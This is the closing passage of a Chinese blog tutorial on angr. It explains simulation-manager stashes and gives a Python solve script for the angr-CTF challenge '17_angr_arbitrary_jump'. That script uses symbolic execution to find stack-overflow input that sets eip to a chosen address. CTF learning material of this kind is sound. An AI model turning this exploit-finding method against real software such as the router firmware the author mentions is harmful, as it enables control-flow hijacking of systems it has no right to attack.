<li><code>simgr.pruned</code>：被剪枝的状态列表。在指定了 <code>LAZY_SOLVES</code> 时，状态仅在必要时检查可满足性，当一个状态在指定了 <code>LAZY_SOLVES</code> 时被发现是不可满足的（unsat），状态层（state hierarchy）将会被遍历以确认在其历史中最初变为不满足的时间，该点及其所有后代都会被  <em>剪枝</em>  （pruned）并放入该列表</li>
<li><code>simgr.unconstrained</code>：不受约束的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unconstrained=True</code>，则被认为<strong>不受约束的</strong>（unconstrained，即指令指针被用户数据或其他来源的符号化数据控制）状态会被归入该列表</li>
<li><code>simgr.unsat</code>：不可满足的状态列表。当创建 <code>SimulationManager</code> 时指定了 <code>save_unsat=True</code>，则被认为无法被满足的（unsatisfiable，即存在<strong>约束冲突</strong>的状态，例如在同一时刻要求输入既是<code>&quot;AAAA&quot;</code> 又是 <code>&quot;BBBB&quot;</code>）状态会被归入该列表</li>
</ul>
<p>还有一种不是 stash 的状态列表——<code>errored</code>，若在执行中产生了错误，则状态与其产生的错误会被包裹在一个 <code>ErrorRecord</code> 实例中（可通过 <code>record.state</code> 与 <code>record.error</code> 访问），该 record 会被插入到 <code>errored</code> 中，我们可以通过 <code>record.debug()</code> 启动一个调试窗口</p>
<h4 id="②-stash-操作"><a href="#②-stash-操作" class="headerlink" title="② stash 操作"></a>② stash 操作</h4><p>我们可以使用 <code>stash.move()</code> 来在 stash 之间转移放置状态，用法如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>)<br></code></pre></td></tr></table></figure>

<p>在转移当中我们还可以通过指定 <code>filter_func</code> 参数来进行过滤：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br><span class="hljs-meta">... </span>    <span class="hljs-keyword">return</span> <span class="hljs-string">b&#x27;arttnba3&#x27;</span> <span class="hljs-keyword">in</span> state.posix.dumps(<span class="hljs-number">1</span>)<br>...<br><span class="hljs-meta">&gt;&gt;&gt; </span>simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, to_stash = <span class="hljs-string">&#x27;active&#x27;</span>, filter_func = filter_func)<br></code></pre></td></tr></table></figure>

<p>stash 本质上就是个 list，因此在初始化时我们可以通过字典的方式指定每个 stash 的初始内容：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span>simgr = proj.factory.simgr(init_state,<br><span class="hljs-meta">... </span>    stashes = &#123;<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br><span class="hljs-meta">... </span>            <span class="hljs-string">&#x27;found&#x27;</span>:[],<br><span class="hljs-meta">... </span>    &#125;)<br></code></pre></td></tr></table></figure>

<h3 id="FINAL-EXPLOIT-7"><a href="#FINAL-EXPLOIT-7" class="headerlink" title="FINAL EXPLOIT"></a>FINAL EXPLOIT</h3><p>那么由于本题我们需要通过栈溢出来控制 eip，属于 unconstrained 的状态，因此<strong>我们需要手动判断是否找到了 unconstrained 状态</strong>，于是与此前不同的是本题我们通过 <code>simgr.step()</code> 来进行单步执行，若其中某一步获得了 unconstrained state 则我们遍历其中状态并判断是否可以满足控制 eip 为指定值的约束，若是则直接添加到 <code>simgr.found</code> 列表中即可</p>
<p>故最终的解题脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> angr<br><span class="hljs-keyword">import</span> claripy<br><br><span class="hljs-comment"># filter to check satisfiability</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter_func</span>(<span class="hljs-params">state</span>):<br>    print_good_addr = <span class="hljs-number">0x58465168</span><br>    <span class="hljs-keyword">return</span> state.satisfiable(extra_constraints = (state.regs.eip == print_good_addr, ))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">solver</span>():<br>    bin_path = <span class="hljs-string">&quot;./17_angr_arbitrary_jump&quot;</span><br>    proj = angr.Project(bin_path)<br><br>    <span class="hljs-comment"># hook the scanf to symbolize our input</span><br>    <span class="hljs-keyword">class</span> <span class="hljs-title class_">SimScanfProcedure</span>(angr.SimProcedure):<br>        <span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">self, fmtstr, input_addr</span>):<br>            input_bvs = claripy.BVS(<span class="hljs-string">&#x27;input_addr&#x27;</span>, <span class="hljs-number">200</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">for</span> <span class="hljs-built_in">chr</span> <span class="hljs-keyword">in</span> input_bvs.chop(bits = <span class="hljs-number">8</span>):<br>                self.state.add_constraints(<span class="hljs-built_in">chr</span> &gt;= <span class="hljs-string">&#x27;0&#x27;</span>, <span class="hljs-built_in">chr</span> &lt;= <span class="hljs-string">&#x27;z&#x27;</span>)<br>            self.state.memory.store(input_addr, input_bvs)<br>            self.state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>] = input_bvs<br>            <br>    proj.hook_symbol(<span class="hljs-string">&#x27;__isoc99_scanf&#x27;</span>, SimScanfProcedure())<br><br>    <span class="hljs-comment"># create simgr that can save unconstraints</span><br>    init_state = proj.factory.entry_state()<br>    simgr = proj.factory.simgr(init_state, <br>                               save_unconstrained=<span class="hljs-literal">True</span>,<br>                               stashes = &#123;<br>                                   <span class="hljs-string">&#x27;active&#x27;</span>:[init_state],<br>                                   <span class="hljs-string">&#x27;unconstrained&#x27;</span>:[],<br>                                   <span class="hljs-string">&#x27;found&#x27;</span>:[],<br>                               &#125;)<br><br>    <span class="hljs-comment"># simulated execution by steps</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-keyword">not</span> simgr.found:<br>        <span class="hljs-comment"># no more states for execution</span><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">not</span> simgr.active) <span class="hljs-keyword">and</span> (<span class="hljs-keyword">not</span> simgr.unconstrained):<br>            <span class="hljs-keyword">break</span><br><br>        <span class="hljs-comment"># check for unconstrained states</span><br>        simgr.move(from_stash = <span class="hljs-string">&#x27;unconstrained&#x27;</span>, <br>                  to_stash = <span class="hljs-string">&#x27;found&#x27;</span>,<br>                  filter_func = filter_func)<br><br>        <span class="hljs-comment"># step to next basic block</span><br>        simgr.step()<br><br>    <span class="hljs-keyword">if</span> simgr.found:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] found &#123;&#125; solution state(s)&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(simgr.found)))<br>        solution_state = simgr.found[<span class="hljs-number">0</span>]<br>        print_good_addr = <span class="hljs-number">0x58465168</span><br>        solution_state.add_constraints(solution_state.regs.eip == print_good_addr)<br>        input_val = solution_state.solver.<span class="hljs-built_in">eval</span>(solution_state.<span class="hljs-built_in">globals</span>[<span class="hljs-string">&#x27;input_val&#x27;</span>], <br>                                               cast_to=<span class="hljs-built_in">bytes</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;password: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(input_val))<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;Could not find the solution!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    solver()<br></code></pre></td></tr></table></figure>

<p>运行即可获得 <code>&quot;Good Job.&quot;</code></p>
<p><img src="https://s2.loli.net/2022/12/03/Zf6w1xrNFc5HvLI.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
<p>至此，angr CTF 的 18 道题目<strong>全部完结</strong></p>
<h1 id="0xFF-What’s-more…"><a href="#0xFF-What’s-more…" class="headerlink" title="0xFF.What’s more…"></a>0xFF.What’s more…</h1><p>作为用来入门 angr 基本用法的题目，angr CTF 自然不会太难，不过笔者确乎通过 angr 体会到了<strong>符号执行这一技术的美感所在</strong>（虽然说这个感触好像比较玄学 : ) ）</p>
<p>不同于代码审计或是比较偏“暴力”的 fuzz，符号执行这一技术还向我们展现了具有别样美感的漏洞挖掘与 exp 编写技巧，以 angr CTF 为例，虽然说最后三道漏洞利用题目看起来好像都挺笨，但设想将第 17 题换成这样的一个场景——我们正在挖掘一个逻辑比较复杂的现代软件（例如一个存在栈溢出的路由器固件，我们的输入可以是向路由器发送的数据包（比如说对路由器控制页的 HTTP 请求）），直接逆向审计比较费劲，而暴力 fuzz 又不好搭执行环境，此时无需实际执行二进制文件的符号执行便能很好地发挥其用处</p>
<p>不过需要注意的是以上的 18 道题虽然看似涵盖了 angr 的基本用法，但其实 angr 还有更多更有趣的 API，若是要更加熟练的运用这个顶级的混合执行框架，则还需要我们多多阅读 angr 的文档并多加使用，毕竟 angr-ctf 只是一个最基础的练手级的项目（笑）</p>
<p>符号执行这一技术或许还有更为光明的未来正等待着我们进行探索：）</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
    <div class="post-meta mr-3 d-flex align-items-center">
      <i class="iconfont icon-category"></i>
      

<span class="category-chains">
  
  
    
      <span class="category-chain">
        
  <a href="/categories/ANGR/" class="category-chain-item">ANGR</a>
  
  

      </span>
    
  
</span>

    </div>
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/angr/">#angr</a>
      
        <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/">#信息安全</a>
      
        <a href="/tags/%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/">#符号执行</a>
      
        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/">#二进制安全</a>
      
        <a href="/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%88%86%E6%9E%90/">#二进制分析</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>【ANGR.0x00】从 angr-CTF 入门 angr 的基本用法</div>
      <div>https://arttnba3.github.io/2022/11/24/ANGR-0X00-ANGR_CTF/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>arttnba3</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2022年11月24日</div>
        </div>
      
      
      <div class="license-meta-item">
        <div>许可协议</div>
        <div>
          
            
            
              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
              <span class="hint--top hint--rounded" aria-label="BY - 署名">
                <i class="iconfont icon-by"></i>
              </span>
              </a>
            
          
        </div>
      </div>
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2022/12/25/EXPR-0X01-MIT_6_858/" title="【EXPR.0x01】MIT 6.858 课程实验报告">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">【EXPR.0x01】MIT 6.858 课程实验报告</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2022/10/30/PAPER-0X00-FUZZING_A_SURVEY_FOR_ROADMAP/" title="【PAPER.0x00】论文笔记：Fuzzing: A Survey for Roadmap ">
                        <span class="hidden-mobile">【PAPER.0x00】论文笔记：Fuzzing: A Survey for Roadmap </span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
  <article id="comments" lazyload>
    
  <div id="valine"></div>
  <script type="text/javascript">
    Fluid.utils.loadComments('#valine', function() {
      Fluid.utils.createScript('https://lib.baomitu.com/valine/1.4.17/Valine.min.js', function() {
        var options = Object.assign(
          {"appid":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appkey":"tuvJh3xYxPFcW2JB6K26RKP2","path":"window.location.pathname","placeholder":"说点什么呗（笑）","avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false,"appId":"ICj6cPRQWFTNiOttBHlzxnIv-gzGzoHsz","appKey":"tuvJh3xYxPFcW2JB6K26RKP2"},
          {
            el: "#valine",
            path: window.location.pathname
          }
        )
        new Valine(options);
        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
          var imgSelector = '#valine .vcontent img:not(.vemoji)';
          Fluid.plugins.imageCaption(imgSelector);
          Fluid.plugins.fancyBox(imgSelector);
        })
      });
    });
  </script>
  <noscript>Please enable JavaScript to view the comments</noscript>


  </article>


          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  


  
  









    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  <!-- 网站运行时间的设置 -->
  <span id="timeDate">载入天数...</span>
  <span id="times">载入时分秒...</span>
  <script>
      var now = new Date();
      function createtime() {
          var grt= new Date("04/20/2020 17:48:48");//此处修改你的建站时间或者网站上线时间
          now.setTime(now.getTime()+250);
          days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
          hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
          if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
          mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
          seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
          snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
          document.getElementById("timeDate").innerHTML = "arttnba3的小屋已经安全存在了 "+dnum+" 天 ";
          document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
      }
  setInterval("createtime()",250);
  </script>
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
    <div class="statistics">
  
  

  
    
      <span id="busuanzi_container_site_pv" style="display: none">
        总访问量 
        <span id="busuanzi_value_site_pv"></span>
         次
      </span>
    
    
      <span id="busuanzi_container_site_uv" style="display: none">
        总访客数 
        <span id="busuanzi_value_site_uv"></span>
         人
      </span>
    
    
  
</div>

  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

    window.tocbot.init({
      tocSelector     : '#toc-body',
      contentSelector : '.markdown-body',
      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
      linkClass       : 'tocbot-link',
      activeLinkClass : 'tocbot-active-link',
      listClass       : 'tocbot-list',
      isCollapsedClass: 'tocbot-is-collapsed',
      collapsibleClass: 'tocbot-is-collapsible',
      collapseDepth   : CONFIG.toc.collapseDepth || 0,
      scrollSmooth    : true,
      headingsOffset  : -boardTop
    });
    if (toc.find('.toc-list-item').length > 0) {
      toc.css('visibility', 'visible');
    }
  });
</script>


  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>

  <script>Fluid.plugins.codeWidget();</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
    window.anchors.options = {
      placement: CONFIG.anchorjs.placement,
      visible  : CONFIG.anchorjs.visible
    };
    if (CONFIG.anchorjs.icon) {
      window.anchors.options.icon = CONFIG.anchorjs.icon;
    }
    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
    var res = [];
    for (var item of el) {
      res.push('.markdown-body > ' + item.trim());
    }
    if (CONFIG.anchorjs.placement === 'left') {
      window.anchors.options.class = 'anchorjs-link-left';
    }
    window.anchors.add(res.join(', '));
  });
</script>


  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
    Fluid.plugins.fancyBox();
  });
</script>


  <script>Fluid.plugins.imageCaption();</script>

  
      <script>
        if (!window.MathJax) {
          window.MathJax = {
            tex    : {
              inlineMath: { '[+]': [['$', '$']] }
            },
            loader : {
              load: ['ui/lazy']
            },
            options: {
              renderActions: {
                insertedScript: [200, () => {
                  document.querySelectorAll('mjx-container').forEach(node => {
                    let target = node.parentNode;
                    if (target.nodeName.toLowerCase() === 'li') {
                      target.parentNode.classList.add('has-jax');
                    }
                  });
                }, '', false]
              }
            }
          };
        } else {
          MathJax.startup.document.state(0);
          MathJax.texReset();
          MathJax.typeset();
          MathJax.typesetPromise();
        }
      </script>
    

  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>

  <script  src="/js/local-search.js" ></script>

  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>





<!-- 主题的启动项，将它保持在最底部 -->
<!-- the boot of the theme, keep it at the bottom -->
<script  src="/js/boot.js" ></script>


  

  <noscript>
    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
  </noscript>
</body>
</html>
